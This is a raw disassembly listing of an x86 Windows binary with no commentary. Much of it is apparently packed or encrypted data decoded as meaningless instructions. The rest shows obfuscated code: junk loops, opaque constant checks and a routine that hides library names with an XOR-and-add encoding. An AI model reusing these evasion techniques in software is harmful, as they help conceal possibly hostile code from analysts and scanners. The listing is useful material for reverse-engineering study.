  41f5b9:	das    
  41f5ba:	lods   eax,DWORD PTR ds:[esi]
  41f5bb:	loopne 0x41f54d
  41f5bd:	stos   DWORD PTR es:[edi],eax
  41f5be:	arpl   WORD PTR [edi+0x5b856325],dx
  41f5c4:	xchg   esi,eax
  41f5c5:	daa    
  41f5c6:	and    bh,BYTE PTR [ebx-0x73]
  41f5c9:	cs popf 
  41f5cb:	test   BYTE PTR [ecx-0x72d8edf],0xe9
  41f5d2:	mov    dh,0x17
  41f5d4:	js     0x41f5d4
  41f5d6:	loope  0x41f5a3
  41f5d8:	icebp  
  41f5d9:	int    0x6b
  41f5db:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f5dc:	jl     0x41f58b
  41f5de:	mov    ebp,0x32c5abd8
  41f5e3:	or     BYTE PTR [eax-0x12],bl
  41f5e6:	cli    
  41f5e7:	cmp    cl,BYTE PTR [edx+0x3a976103]
  41f5ed:	sti    
  41f5ee:	sub    DWORD PTR [edi],esp
  41f5f0:	adc    DWORD PTR [ecx+esi*4+0x5e],esi
  41f5f4:	dec    esp
  41f5f5:	dec    edx
  41f5f6:	ins    BYTE PTR es:[edi],dx
  41f5f7:	addr16 dec eax
  41f5f9:	enter  0xd3cc,0x43
  41f5fd:	cmp    eax,0xd941a8fe
  41f602:	mov    ds:0x13383ffd,eax
  41f607:	mov    esi,0x2c41cb26
  41f60c:	dec    ebx
  41f60d:	inc    edi
  41f60e:	pusha  
  41f60f:	enter  0x4e67,0x47
  41f613:	rcl    BYTE PTR fs:[edx-0x1397bd37],0x2b
  41f61b:	sub    BYTE PTR [eax+ebx*8-0xdf951a3],cl
  41f622:	cwde   
  41f623:	add    esi,edx
  41f625:	dec    ebx
  41f626:	mov    ah,0x22
  41f628:	inc    eax
  41f629:	out    0xfd,eax
  41f62b:	push   es
  41f62c:	popf   
  41f62d:	xor    DWORD PTR [edx],edi
  41f62f:	sbb    BYTE PTR [esi-0x2a37aa81],al
  41f635:	pop    ecx
  41f636:	and    al,0x0
  41f638:	mov    esi,0x2469d0f3
  41f63d:	mov    dh,0xcc
  41f63f:	and    ecx,0x3e
  41f642:	add    BYTE PTR [ebp+esi*2-0x19],ch
  41f646:	add    al,0xc1
  41f648:	imul   ebp,DWORD PTR [ebx],0x2d
  41f64b:	std    
  41f64c:	fisttp QWORD PTR [esi+0x34]
  41f64f:	out    dx,eax
  41f650:	fimul  WORD PTR [ebx]
  41f652:	ds sbb eax,0x9650934d
  41f658:	in     al,dx
  41f659:	sbb    ebx,DWORD PTR [edi]
  41f65b:	repz in eax,0x2a
  41f65e:	dec    esp
  41f65f:	and    DWORD PTR [esi-0x2ae7f6b3],esi
  41f665:	sti    
  41f666:	sbb    eax,0xe1c716
  41f66b:	pop    ds
  41f66c:	jl     0x41f609
  41f66e:	xor    BYTE PTR [ebx+0x3c66f9fe],cl
  41f674:	push   eax
  41f675:	fmul   DWORD PTR [esi]
  41f677:	pushf  
  41f678:	jg     0x41f65f
  41f67a:	ja     0x41f64c
  41f67c:	xchg   edi,eax
  41f67d:	cmp    DWORD PTR [ebp+0x32f4fbc0],eax
  41f683:	jno    0x41f66b
  41f685:	xchg   ecx,edx
  41f687:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f688:	cmc    
  41f689:	jo     0x41f6f0
  41f68b:	pop    es
  41f68c:	scas   al,BYTE PTR es:[edi]
  41f68d:	rcr    bl,0xea
  41f690:	jb     0x41f6b1
  41f692:	xchg   edi,eax
  41f693:	push   esp
  41f694:	push   cs
  41f695:	pushf  
  41f696:	mov    edi,0x1aac6495
  41f69b:	push   ebx
  41f69c:	ss xchg ecx,eax
  41f69e:	ret    
  41f69f:	mov    BYTE PTR ds:0x40ea12ba,dl
  41f6a5:	nop
  41f6a6:	mov    BYTE PTR [ecx],ch
  41f6a8:	das    
  41f6a9:	mov    ebx,0x35f15b7c
  41f6ae:	mul    DWORD PTR [esi]
  41f6b0:	in     al,dx
  41f6b1:	jns    0x41f71f
  41f6b3:	xor    BYTE PTR [ebp+0x49],dh
  41f6b6:	xchg   ecx,eax
  41f6b7:	packuswb mm4,mm6
  41f6ba:	adc    esi,DWORD PTR [ecx+0x53114d46]
  41f6c0:	popf   
  41f6c1:	add    cl,0xdf
  41f6c4:	cmc    
  41f6c5:	mov    ds:0xfefdbc0,eax
  41f6ca:	adc    al,0xb
  41f6cc:	adc    ch,dl
  41f6ce:	test   BYTE PTR gs:[edi+0x3f],0x8a
  41f6d3:	in     eax,dx
  41f6d4:	mov    edx,0x2e91a776
  41f6d9:	or     edi,DWORD PTR [ebp+0x3b]
  41f6dc:	test   al,0x3a
  41f6de:	inc    ebp
  41f6df:	xchg   edi,eax
  41f6e0:	loop   0x41f6aa
  41f6e2:	sub    DWORD PTR [edx-0x63],ebp
  41f6e5:	mov    eax,0x19ed4971
  41f6ea:	jns    0x41f6ff
  41f6ec:	in     al,0x33
  41f6ee:	mov    ds:0xb8a50252,eax
  41f6f3:	jae    0x41f73b
  41f6f5:	leave  
  41f6f6:	jp     0x41f696
  41f6f8:	enter  0x1dda,0x99
  41f6fc:	aaa    
  41f6fd:	imul   edi,DWORD PTR [eax-0x29cb529d],0x411b9a63
  41f707:	shl    ah,1
  41f709:	(bad)  
  41f70a:	push   eax
  41f70b:	and    DWORD PTR [eax],0x45f041d3
  41f711:	icebp  
  41f712:	inc    edx
  41f713:	or     BYTE PTR [edx],0xb
  41f716:	sbb    al,0x3
  41f718:	jae    0x41f718
  41f71a:	jl     0x41f6ad
  41f71c:	dec    bp
  41f71e:	jp     0x41f755
  41f720:	mov    ds:0xe1a1b209,eax
  41f725:	int3   
  41f726:	xchg   ebx,eax
  41f727:	mov    dh,BYTE PTR [ebx+0x50]
  41f72a:	(bad)  
  41f72b:	push   edi
  41f72c:	(bad)  [eax+edx*1]
  41f72f:	mov    ds:0xf529add8,al
  41f734:	gs pop eax
  41f736:	cmp    ebp,DWORD PTR [ebx+0x24]
  41f739:	jns    0x41f7ba
  41f73b:	ret    
  41f73c:	(bad)  
  41f73d:	(bad)  
  41f73e:	cs test eax,0x468ccb40
  41f744:	fwait
  41f745:	clc    
  41f746:	cld    
  41f747:	push   ds
  41f748:	daa    
  41f749:	in     eax,0x50
  41f74b:	sub    bl,BYTE PTR [esi]
  41f74d:	add    al,0x40
  41f74f:	xchg   esi,eax
  41f750:	add    BYTE PTR [edi+0x287a1dd0],dh
  41f756:	jp     0x41f74d
  41f758:	jns    0x41f77e
  41f75a:	iret   
  41f75b:	loopne 0x41f713
  41f75d:	add    eax,0x1e51ba3b
  41f762:	fldenv [ecx]
  41f764:	add    esp,DWORD PTR [ebx]
  41f766:	xchg   esi,eax
  41f767:	repz and DWORD PTR [edi],eax
  41f76a:	out    0x12,al
  41f76c:	rcl    BYTE PTR [edx],cl
  41f76e:	mov    eax,0x52fd2c11
  41f773:	cmovb  esp,DWORD PTR [edx]
  41f776:	add    ah,BYTE PTR [eax]
  41f778:	ds iret 
  41f77a:	into   
  41f77b:	dec    ebx
  41f77c:	mov    ds:0x699abc0c,eax
  41f781:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f782:	cld    
  41f783:	xor    edx,esp
  41f785:	int3   
  41f786:	fisub  WORD PTR [edi]
  41f788:	cmp    DWORD PTR [ebx+0x1667e2da],esp
  41f78e:	iret   
  41f78f:	pop    esp
  41f790:	xor    ch,dh
  41f792:	stos   BYTE PTR es:[edi],al
  41f793:	sti    
  41f794:	pop    ecx
  41f795:	ret    
  41f796:	sub    al,0x56
  41f798:	stos   BYTE PTR es:[edi],al
  41f799:	pop    ebx
  41f79a:	cli    
  41f79b:	imul   esi,esp,0x66e62e3b
  41f7a1:	into   
  41f7a2:	(bad)  [ecx+0x1bde3c7d]
  41f7a8:	repz cmc 
  41f7aa:	daa    
  41f7ab:	push   ebx
  41f7ac:	xlat   BYTE PTR ds:[ebx]
  41f7ad:	cmp    cl,BYTE PTR [eax-0x56f84562]
  41f7b3:	data16 ds mov dh,0xe3
  41f7b7:	ss dec ebp
  41f7b9:	div    BYTE PTR [eax+0x35b52e76]
  41f7bf:	les    ebp,FWORD PTR [edi-0xa]
  41f7c2:	int3   
  41f7c3:	retf   
  41f7c4:	ficomp DWORD PTR [esi-0x74]
  41f7c7:	xor    eax,0x7259f9cd
  41f7cc:	dec    edi
  41f7cd:	(bad)  
  41f7ce:	sbb    BYTE PTR [edi],dh
  41f7d0:	arpl   WORD PTR [eax],si
  41f7d2:	lods   eax,DWORD PTR ds:[esi]
  41f7d3:	push   ebp
  41f7d4:	fnstsw WORD PTR [ecx-0x74]
  41f7d7:	dec    esp
  41f7d8:	xor    edx,DWORD PTR [edi+0x410574af]
  41f7de:	repz add al,0x32
  41f7e1:	out    dx,al
  41f7e2:	pop    ss
  41f7e3:	xchg   DWORD PTR [edx-0x72],esp
  41f7e6:	loop   0x41f84f
  41f7e8:	inc    ebp
  41f7e9:	push   esp
  41f7ea:	push   esi
  41f7eb:	leave  
  41f7ec:	cmc    
  41f7ed:	test   BYTE PTR [edi+0x34fb8394],ah
  41f7f3:	push   edx
  41f7f4:	out    0xcb,al
  41f7f6:	stc    
  41f7f7:	and    edx,edi
  41f7f9:	ja     0x41f80e
  41f7fb:	adc    eax,0x34452b14
  41f800:	pop    esp
  41f801:	outs   dx,BYTE PTR ds:[esi]
  41f802:	mov    edi,0x11bf9474
  41f807:	add    ah,dh
  41f809:	bound  ebx,QWORD PTR [ebp-0x543bd7a6]
  41f80f:	fdiv   QWORD PTR [esi]
  41f811:	xchg   esi,eax
  41f812:	pop    ds
  41f813:	stos   BYTE PTR es:[edi],al
  41f814:	fwait
  41f815:	sub    eax,0x613713f7
  41f81a:	int3   
  41f81b:	dec    BYTE PTR [eax-0x6b]
  41f81e:	adc    al,0xc3
  41f820:	pop    ebp
  41f821:	lods   al,BYTE PTR ds:[esi]
  41f822:	jne    0x41f82d
  41f824:	sub    dl,0xc7
  41f827:	rcl    DWORD PTR [edi],cl
  41f829:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f82a:	adc    DWORD PTR [esi],eax
  41f82c:	push   ecx
  41f82d:	and    bh,BYTE PTR [edx+0x64]
  41f830:	idiv   DWORD PTR [ebx+esi*8]
  41f833:	adc    bh,BYTE PTR [ebp*1+0x3dd425a0]
  41f83a:	xchg   edx,eax
  41f83b:	sbb    BYTE PTR [edi],bl
  41f83d:	dec    esi
  41f83e:	repnz repz aas 
  41f841:	imul   esp,DWORD PTR [ebx],0x49f4b61b
  41f847:	mov    esp,0xae9d4f00
  41f84c:	scas   eax,DWORD PTR es:[edi]
  41f84d:	stos   DWORD PTR es:[edi],eax
  41f84e:	imul   ebp,DWORD PTR [ebx-0x7c],0x386d79db
  41f855:	fwait
  41f856:	std    
  41f857:	sub    DWORD PTR [esi],eax
  41f859:	xor    DWORD PTR [edx-0xffa32ca],ecx
  41f85f:	fldenv ss:[eax-0x14d41b23]
  41f866:	adc    BYTE PTR cs:[eax-0x14f932a],ah
  41f86d:	mov    al,0xe9
  41f86f:	xor    BYTE PTR [eax],dh
  41f871:	push   cs
  41f872:	adc    eax,esp
  41f874:	aaa    
  41f875:	mov    edx,0x3272fa
  41f87a:	sub    eax,edx
  41f87c:	or     ecx,DWORD PTR ds:0x426eb9
  41f882:	mov    ecx,0x75108b3
  41f887:	or     DWORD PTR ds:0x426e85,0x426eb1
  41f891:	xor    eax,ecx
  41f893:	cmp    eax,0xf89c85e0
  41f898:	jne    0x41f8d1
  41f89e:	mov    eax,DWORD PTR [ebp+0x8]
  41f8a1:	sbb    DWORD PTR ds:0x426ef1,0x426f1d
  41f8ab:	push   esi
  41f8ac:	mov    esi,DWORD PTR [ebp+0x8]
  41f8af:	add    esi,DWORD PTR [eax+0x3c]
  41f8b2:	mov    DWORD PTR [ebp+0x8],esi
  41f8b5:	mov    eax,DWORD PTR [ebp-0x4]
  41f8b8:	mov    esi,DWORD PTR [ebp+0x8]
  41f8bb:	xor    eax,ecx
  41f8bd:	add    eax,edx
  41f8bf:	cmp    DWORD PTR [esi+0x54],eax
  41f8c2:	pop    esi
  41f8c3:	je     0x41f8d1
  41f8c9:	mov    eax,DWORD PTR [ebp+0x8]
  41f8cc:	jmp    0x41f8d8
  41f8d1:	mov    eax,DWORD PTR [ebp-0x4]
  41f8d4:	xor    eax,ecx
  41f8d6:	add    eax,edx
  41f8d8:	leave  
  41f8d9:	ret    0x4
  41f8dc:	push   ebp
  41f8dd:	mov    ebp,esp
  41f8df:	sub    esp,0xc
  41f8e2:	push   esi
  41f8e3:	mov    esi,DWORD PTR ds:0x429d65
  41f8e9:	mov    edx,DWORD PTR ds:0x42af5d
  41f8ef:	sub    edx,esi
  41f8f1:	or     esi,DWORD PTR [esi+edx*1]
  41f8f4:	mov    eax,0xf89c85b5
  41f8f9:	adc    DWORD PTR ds:0x426ed9,edx
  41f8ff:	mov    DWORD PTR [ebp-0x8],eax
  41f902:	mov    DWORD PTR [ebp-0x4],0xf89c85b4
  41f909:	sub    DWORD PTR ds:0x426ef9,0x356c
  41f913:	mov    esi,DWORD PTR [ebp-0x4]
  41f916:	add    DWORD PTR ds:0x426eed,0x182c
  41f920:	push   edi
  41f921:	mov    edi,DWORD PTR [ebp-0x8]
  41f924:	or     ecx,edx
  41f926:	mov    ecx,0x75108b3
  41f92b:	sub    DWORD PTR ds:0x426ed1,edi
  41f931:	xor    esi,ecx
  41f933:	and    DWORD PTR ds:0x426eb1,0x0
  41f93d:	mov    edx,DWORD PTR ds:0x426eb1
  41f943:	inc    edx
  41f944:	mov    DWORD PTR ds:0x426eb1,edx
  41f94a:	cmp    DWORD PTR ds:0x426eb1,0x1e
  41f951:	jle    0x41f96f
  41f957:	jmp    0x41f962
  41f95c:	call   DWORD PTR ds:0x430a00
  41f962:	cmp    DWORD PTR ds:0x426eb1,0x19
  41f969:	jb     0x41f93d
  41f96f:	xor    edi,ecx
  41f971:	and    DWORD PTR ds:0x426e99,0x0
  41f97b:	jmp    0x41f98d
  41f980:	mov    edx,DWORD PTR ds:0x426e99
  41f986:	inc    edx
  41f987:	mov    DWORD PTR ds:0x426e99,edx
  41f98d:	cmp    DWORD PTR ds:0x426e99,0x12
  41f994:	jae    0x41f9eb
  41f99a:	cmp    DWORD PTR ds:0x426e99,0x4
  41f9a1:	ja     0x41f9eb
  41f9a7:	jmp    0x41f9cc
  41f9ac:	push   0x426efd
  41f9b1:	push   DWORD PTR [ebp-0x18]
  41f9b4:	push   DWORD PTR [ebp-0x14]
  41f9b7:	push   0x69eb
  41f9bc:	push   0x7974
  41f9c1:	push   0x5e98
  41f9c6:	call   DWORD PTR ds:0x430a40
  41f9cc:	cmp    DWORD PTR ds:0x426e99,0x3
  41f9d3:	jne    0x41f9e6
  41f9d9:	mov    edx,DWORD PTR ds:0x426e99
  41f9df:	inc    edx
  41f9e0:	mov    DWORD PTR ds:0x426e99,edx
  41f9e6:	jmp    0x41f980
  41f9eb:	mov    edx,0x3272fa
  41f9f0:	mov    DWORD PTR ds:0x426ef5,0xc6
  41f9fa:	add    edi,edx
  41f9fc:	add    esi,edx
  41f9fe:	imul   esi,edi
  41fa01:	mov    edi,DWORD PTR [ebp+0xc]
  41fa04:	cmp    edi,esi
  41fa06:	je     0x41fa5b
  41fa0c:	mov    DWORD PTR [ebp-0xc],eax
  41fa0f:	mov    eax,DWORD PTR [ebp-0xc]
  41fa12:	mov    esi,DWORD PTR [ebp+0xc]
  41fa15:	xor    eax,ecx
  41fa17:	lea    eax,[eax*8+0x1939848]
  41fa1e:	mov    eax,DWORD PTR [esi+eax*1]
  41fa21:	mov    DWORD PTR [ebp+0xc],eax
  41fa24:	mov    eax,DWORD PTR [ebp-0x4]
  41fa27:	mov    esi,DWORD PTR [ebp-0x8]
  41fa2a:	xor    eax,ecx
  41fa2c:	xor    esi,ecx
  41fa2e:	add    esi,edx
  41fa30:	add    eax,edx
  41fa32:	imul   eax,esi
  41fa35:	mov    esi,DWORD PTR [ebp+0xc]
  41fa38:	cmp    esi,eax
  41fa3a:	je     0x41fa5b
  41fa40:	mov    eax,DWORD PTR [ebp-0x4]
  41fa43:	xor    eax,ecx
  41fa45:	mov    ecx,DWORD PTR [ebp+0xc]
  41fa48:	add    eax,edx
  41fa4a:	imul   eax,ecx
  41fa4d:	add    eax,DWORD PTR [ebp+0x8]
  41fa50:	mov    DWORD PTR [ebp+0xc],eax
  41fa53:	mov    eax,DWORD PTR [ebp+0xc]
  41fa56:	jmp    0x41fa6c
  41fa5b:	mov    eax,DWORD PTR [ebp-0x4]
  41fa5e:	mov    esi,DWORD PTR [ebp-0x8]
  41fa61:	xor    esi,ecx
  41fa63:	xor    eax,ecx
  41fa65:	add    esi,edx
  41fa67:	add    eax,edx
  41fa69:	imul   eax,esi
  41fa6c:	pop    edi
  41fa6d:	pop    esi
  41fa6e:	leave  
  41fa6f:	ret    0x8
	...
  41fa82:	add    BYTE PTR [eax],al
  41fa84:	pop    ds
  41fa85:	sbb    esi,DWORD PTR [ebp+ecx*2+0x0]
  41fa89:	add    BYTE PTR [eax],al
  41fa8b:	add    BYTE PTR [edx],al
  41fa8d:	add    BYTE PTR [eax],al
  41fa8f:	add    BYTE PTR [ecx+0x0],al
  41fa92:	add    BYTE PTR [eax],al
  41fa94:	mov    al,ds:0xa00001fa
  41fa99:	out    dx,al
  41fa9a:	add    DWORD PTR [eax],eax
  41fa9c:	add    BYTE PTR [eax],al
  41fa9e:	add    BYTE PTR [eax],al
  41faa0:	push   edx
  41faa1:	push   ebx
  41faa2:	inc    esp
  41faa3:	push   ebx
  41faa4:	jl     0x41fa67
  41faa6:	jle    0x41fabb
  41faa8:	jo     0x41fac1
  41faaa:	pop    es
  41faab:	inc    esp
  41faac:	mov    edi,DWORD PTR [ebp-0xe]
  41faaf:	dec    edi
  41fab0:	dec    ebx
  41fab1:	(bad)  
  41fab2:	cmp    al,0x0
  41fab4:	add    DWORD PTR [eax],eax
  41fab6:	add    BYTE PTR [eax],al
  41fab8:	inc    ebx
  41fab9:	cmp    bl,BYTE PTR [esi+eax*2+0x6f]
  41fabd:	ins    BYTE PTR es:[edi],dx
  41fabe:	fs gs jb 0x41fae2
  41fac2:	outs   dx,DWORD PTR ds:[esi]
  41fac3:	data16 and BYTE PTR [edi+0x6f],dl
  41fac7:	jb     0x41fb34
  41fac9:	imul   ebp,DWORD PTR [esi+0x67],0x6f725020
  41fad0:	push   0x65
  41fad2:	arpl   WORD PTR [esp+ebx*2+0x50],si
  41fad6:	jb     0x41fb47
  41fad8:	push   0x65
  41fada:	arpl   WORD PTR [esp+edx*2+0x65],si
  41fade:	jae    0x41fb54
  41fae0:	add    BYTE PTR [ebx-0x137e13ab],cl
  41fae6:	or     BYTE PTR [ecx],al
  41fae8:	add    BYTE PTR [eax],al
  41faea:	push   ebx
  41faeb:	mov    eax,ebx
  41faed:	xchg   ecx,eax
  41faee:	mov    eax,DWORD PTR [ebp+0x8]
  41faf1:	cmp    eax,0xf89c85b5
  41faf6:	jne    0x41ff8a
  41fafc:	mov    eax,DWORD PTR [ebp+0xc]
  41faff:	cmp    eax,0xf89c85b4
  41fb04:	jne    0x41ff8a
  41fb0a:	mov    eax,DWORD PTR [ebp+0x24]
  41fb0d:	mov    DWORD PTR [ebp-0x4],eax
  41fb10:	mov    eax,DWORD PTR [ebp-0x4]
  41fb13:	mov    eax,DWORD PTR [eax+0x1d8]
  41fb19:	mov    eax,DWORD PTR [eax]
  41fb1b:	mov    eax,DWORD PTR [eax]
  41fb1d:	mov    DWORD PTR [ebp-0x8],eax
  41fb20:	mov    BYTE PTR [ebp-0x18],0xe0
  41fb24:	mov    BYTE PTR [ebp-0x17],0xdf
  41fb28:	mov    BYTE PTR [ebp-0x16],0xe2
  41fb2c:	mov    BYTE PTR [ebp-0x15],0xac
  41fb30:	mov    BYTE PTR [ebp-0x14],0xad
  41fb34:	mov    BYTE PTR [ebp-0x13],0x7b
  41fb38:	mov    BYTE PTR [ebp-0x20],0xee
  41fb3c:	mov    BYTE PTR [ebp-0x1f],0xec
  41fb40:	mov    BYTE PTR [ebp-0x1e],0xde
  41fb44:	mov    BYTE PTR [ebp-0x1d],0xed
  41fb48:	mov    BYTE PTR [ebp-0x1c],0xac
  41fb4c:	mov    BYTE PTR [ebp-0x1b],0xad
  41fb50:	mov    BYTE PTR [ebp-0x1a],0x7b
  41fb54:	mov    BYTE PTR [ebp-0x28],0xec
  41fb58:	mov    BYTE PTR [ebp-0x27],0xe3
  41fb5c:	mov    BYTE PTR [ebp-0x26],0xe7
  41fb60:	mov    BYTE PTR [ebp-0x25],0xf0
  41fb64:	mov    BYTE PTR [ebp-0x24],0xda
  41fb68:	mov    BYTE PTR [ebp-0x23],0xeb
  41fb6c:	mov    BYTE PTR [ebp-0x22],0xe2
  41fb70:	mov    BYTE PTR [ebp-0x21],0x7b
  41fb74:	xor    ecx,ecx
  41fb76:	lea    eax,[ebp+ecx*1-0x18]
  41fb7a:	movzx  edx,BYTE PTR [eax]
  41fb7d:	xor    edx,0x81
  41fb83:	add    edx,0x6
  41fb86:	inc    ecx
  41fb87:	mov    BYTE PTR [eax],dl
  41fb89:	cmp    ecx,0x6
  41fb8c:	jb     0x41fb76
  41fb8e:	xor    ecx,ecx
  41fb90:	lea    eax,[ebp+ecx*1-0x20]
  41fb94:	movzx  edx,BYTE PTR [eax]
  41fb97:	xor    edx,0x81
  41fb9d:	add    edx,0x6
  41fba0:	inc    ecx
  41fba1:	mov    BYTE PTR [eax],dl
  41fba3:	cmp    ecx,0x7
  41fba6:	jb     0x41fb90
  41fba8:	xor    ecx,ecx
  41fbaa:	lea    eax,[ebp+ecx*1-0x28]
  41fbae:	movzx  edx,BYTE PTR [eax]
  41fbb1:	xor    edx,0x81
  41fbb7:	add    edx,0x6
  41fbba:	inc    ecx
  41fbbb:	mov    BYTE PTR [eax],dl
  41fbbd:	cmp    ecx,0x8
  41fbc0:	jb     0x41fbaa
  41fbc2:	lea    eax,[ebp-0x2c]
  41fbc5:	mov    DWORD PTR [ebp-0x8],eax
  41fbc8:	mov    ecx,DWORD PTR [ebp-0x8]
  41fbcb:	mov    eax,0x7113fcef
  41fbd0:	push   esi
  41fbd1:	mov    DWORD PTR [ecx],eax
  41fbd3:	mov    ecx,DWORD PTR [ebp-0x2c]
  41fbd6:	mov    esi,0x4e3c
  41fbdb:	push   edi
  41fbdc:	lea    edi,[esi-0x2]
  41fbdf:	mov    ebx,0x3272fa
  41fbe4:	cmp    ecx,eax
  41fbe6:	jne    0x41fcb7
  41fbec:	lea    eax,[esi+0x3b]
  41fbef:	mov    WORD PTR [ebp-0x78],ax
  41fbf3:	mov    eax,esi
  41fbf5:	mov    WORD PTR [ebp-0x76],ax
  41fbf9:	add    eax,0x3d
  41fbfc:	mov    WORD PTR [ebp-0x74],ax
  41fc00:	lea    eax,[esi+0x2]
  41fc03:	mov    WORD PTR [ebp-0x72],ax
  41fc07:	add    eax,0x41
  41fc0a:	mov    WORD PTR [ebp-0x70],ax
  41fc0e:	mov    eax,edi
  41fc10:	mov    WORD PTR [ebp-0x6e],ax
  41fc14:	mov    eax,0x4f90
  41fc19:	mov    WORD PTR [ebp-0x6c],ax
  41fc1d:	lea    eax,[esi-0x7]
  41fc20:	mov    WORD PTR [ebp-0x6a],ax
  41fc24:	add    eax,0x30
  41fc27:	mov    WORD PTR [ebp-0x68],ax
  41fc2b:	lea    eax,[esi-0xb]
  41fc2e:	mov    WORD PTR [ebp-0x66],ax
  41fc32:	mov    eax,esi
  41fc34:	mov    WORD PTR [ebp-0x64],ax
  41fc38:	add    eax,0xfffffff4
  41fc3b:	mov    WORD PTR [ebp-0x62],ax
  41fc3f:	mov    eax,0x44b
  41fc44:	mov    WORD PTR [ebp-0x60],ax
  41fc48:	mov    eax,0x567a
  41fc4d:	mov    WORD PTR [ebp-0x5e],ax
  41fc51:	mov    eax,0x611a
  41fc56:	mov    WORD PTR [ebp-0x5c],ax
  41fc5a:	mov    eax,0xf1e4
  41fc5f:	mov    WORD PTR [ebp-0x5a],ax
  41fc63:	mov    eax,edi
  41fc65:	mov    WORD PTR [ebp-0x58],ax
  41fc69:	lea    eax,[ebp-0xe0]
  41fc6f:	push   eax
  41fc70:	mov    eax,DWORD PTR [ebp+0xc]
  41fc73:	xor    eax,0x75108b3
  41fc78:	add    eax,ebx
  41fc7a:	push   eax
  41fc7b:	lea    eax,[ebp-0x78]
  41fc7e:	push   eax
  41fc7f:	mov    eax,DWORD PTR [ebp-0x4]
  41fc82:	mov    eax,DWORD PTR [eax+0x198]
  41fc88:	mov    DWORD PTR [ebp-0xe0],0x1
  41fc92:	mov    DWORD PTR [ebp-0xdc],0xffff
  41fc9c:	push   DWORD PTR [eax]
  41fc9e:	mov    eax,DWORD PTR [ebp+0x10]
  41fca1:	call   eax
  41fca3:	mov    DWORD PTR [ebp-0x8],eax
  41fca6:	mov    eax,DWORD PTR [ebp-0x8]
  41fca9:	test   eax,eax
  41fcab:	je     0x41fcb7
  41fcad:	xor    DWORD PTR ds:0xe041cd9,0x9f170bc8
  41fcb7:	mov    eax,DWORD PTR [ebp-0x4]
  41fcba:	mov    ecx,DWORD PTR [eax+0x18c]
  41fcc0:	xor    eax,eax
  41fcc2:	cmp    DWORD PTR [ecx],eax
  41fcc4:	jne    0x41fefa
  41fcca:	mov    ecx,DWORD PTR [ebp-0x4]
  41fccd:	mov    ecx,DWORD PTR [ecx+0x17c]
  41fcd3:	mov    DWORD PTR [ecx],eax
  41fcd5:	mov    ecx,DWORD PTR [ebp-0x4]
  41fcd8:	mov    ecx,DWORD PTR [ecx+0x180]
  41fcde:	mov    DWORD PTR [ecx],eax
  41fce0:	mov    eax,0x4e69
  41fce5:	mov    WORD PTR [ebp-0x9c],ax
  41fcec:	mov    eax,esi
  41fcee:	mov    WORD PTR [ebp-0x9a],ax
  41fcf5:	mov    eax,0x4e79
  41fcfa:	mov    WORD PTR [ebp-0x98],ax
  41fd01:	add    eax,0xffffffc0
  41fd04:	mov    WORD PTR [ebp-0x96],ax
  41fd0b:	mov    eax,0x4f8c
  41fd10:	mov    WORD PTR [ebp-0x94],ax
  41fd17:	mov    eax,0x4e38
  41fd1c:	mov    WORD PTR [ebp-0x92],ax
  41fd23:	mov    eax,esi
  41fd25:	mov    WORD PTR [ebp-0x8c],ax
  41fd2c:	mov    eax,0x4e35
  41fd31:	mov    WORD PTR [ebp-0x8a],ax
  41fd38:	mov    eax,0x99f9
  41fd3d:	mov    WORD PTR [ebp-0x88],ax
  41fd44:	mov    eax,0x8d68
  41fd49:	mov    WORD PTR [ebp-0x86],ax
  41fd50:	mov    eax,0xd66f
  41fd55:	mov    WORD PTR [ebp-0x84],ax
  41fd5c:	mov    BYTE PTR [ebp-0x10],0xec
  41fd60:	mov    eax,0xd78b
  41fd65:	mov    WORD PTR [ebp-0x82],ax
  41fd6c:	mov    BYTE PTR [ebp-0xf],0xe3
  41fd70:	mov    eax,0x278a
  41fd75:	mov    BYTE PTR [ebp-0xe],0xe7
  41fd79:	mov    WORD PTR [ebp-0x80],ax
  41fd7d:	mov    BYTE PTR [ebp-0xd],0xf0
  41fd81:	mov    eax,0x478a
  41fd86:	mov    BYTE PTR [ebp-0xc],0xda
  41fd8a:	mov    WORD PTR [ebp-0x7e],ax
  41fd8e:	mov    eax,0x4e3b
  41fd93:	mov    BYTE PTR [ebp-0xb],0xeb
  41fd97:	push   0x8
  41fd99:	mov    BYTE PTR [ebp-0xa],0xe2
  41fd9d:	mov    WORD PTR [ebp-0x7c],ax
  41fda1:	mov    BYTE PTR [ebp-0x9],0x7b
  41fda5:	mov    DWORD PTR [ebp-0x90],0x4e3a4e65
  41fdaf:	lea    eax,[ebp-0x10]
  41fdb2:	pop    edi
  41fdb3:	movzx  ecx,BYTE PTR [eax]
  41fdb6:	xor    ecx,0x81
  41fdbc:	add    ecx,0x6
  41fdbf:	mov    BYTE PTR [eax],cl
  41fdc1:	inc    eax
  41fdc2:	dec    edi
  41fdc3:	jne    0x41fdb3
  41fdc5:	mov    DWORD PTR [ebp-0xe0],0x1
  41fdcf:	lea    eax,[ebp-0x10]
  41fdd2:	mov    DWORD PTR [ebp-0xdc],eax
  41fdd8:	mov    ecx,0x4e64
  41fddd:	mov    eax,ecx
  41fddf:	mov    WORD PTR [ebp-0x40],ax
  41fde3:	add    eax,0xf
  41fde6:	mov    edx,eax
  41fde8:	mov    WORD PTR [ebp-0x3e],dx
  41fdec:	mov    edx,0x4f9b
  41fdf1:	mov    WORD PTR [ebp-0x3c],dx
  41fdf5:	add    edx,0xfffffff8
  41fdf8:	mov    WORD PTR [ebp-0x3a],dx
  41fdfc:	mov    edx,0x4f8d
  41fe01:	mov    WORD PTR [ebp-0x38],dx
  41fe05:	inc    edx
  41fe06:	mov    WORD PTR [ebp-0x36],dx
  41fe0a:	mov    edx,0x4f87
  41fe0f:	mov    WORD PTR [ebp-0x34],dx
  41fe13:	mov    WORD PTR [ebp-0x32],cx
  41fe17:	mov    ecx,esi
  41fe19:	mov    WORD PTR [ebp-0x30],cx
  41fe1d:	lea    ecx,[edx-0x3]
  41fe20:	mov    edx,ecx
  41fe22:	mov    WORD PTR [ebp-0x54],dx
  41fe26:	mov    edx,eax
  41fe28:	mov    WORD PTR [ebp-0x52],dx
  41fe2c:	mov    edx,0x4e7b
  41fe31:	mov    WORD PTR [ebp-0x50],dx
  41fe35:	mov    WORD PTR [ebp-0x4e],ax
  41fe39:	lea    eax,[edx-0xe]
  41fe3c:	mov    WORD PTR [ebp-0x4c],ax
  41fe40:	inc    eax
  41fe41:	mov    WORD PTR [ebp-0x4a],ax
  41fe45:	lea    eax,[edx-0x14]
